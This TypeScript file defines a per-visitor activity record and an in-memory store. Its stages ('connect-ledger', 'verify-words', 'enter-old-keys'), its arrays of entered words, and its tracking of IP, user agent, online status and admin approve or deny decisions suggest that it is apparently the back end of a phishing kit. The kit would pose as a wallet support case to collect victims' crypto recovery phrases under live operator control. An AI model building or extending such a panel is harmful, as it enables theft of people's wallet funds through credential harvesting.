export interface UserActivity {
  visitorId: string
  ipAddress: string
  currentStage: "intake" | "approval" | "connect-ledger" | "confirm-reset" | "reset-api-keys" | "verify-words" | "enter-old-keys" | "completed"
  email?: string
  caseId?: string
  decisions: {
    requestId: string
    requestName: string
    action: "approved" | "denied" | "pending"
    timestamp: string
  }[]
  sessionStarted: string
  lastUpdated: string
  lastHeartbeat: string
  isOnline: boolean
  userAgent: string
  stage2Data?: {
    waitingForAdmin: boolean
    adminConfirmed: boolean
  }
  stage3Data?: {
    selectedApiKey: string
    downloadClicked: boolean
    downloadTimestamp?: string
  }
  verifyWordsData?: {
    enteredWords: string[]
  }
  oldKeysData?: {
    enteredWords: string[]
    adminConfirmed?: boolean
    adminDenied?: boolean
  }
}

// In-memory store for demo purposes
// In production, use a database
const activityStore: Map<string, UserActivity> = new Map()

export function getActivity(visitorId: string): UserActivity | undefined {
  return activityStore.get(visitorId)
}

export function setActivity(visitorId: string, activity: UserActivity): void {
  activityStore.set(visitorId, activity)
}

export function getAllActivities(): UserActivity[] {
  return Array.from(activityStore.values())
}

export function clearActivity(visitorId: string): void {
  activityStore.delete(visitorId)
}
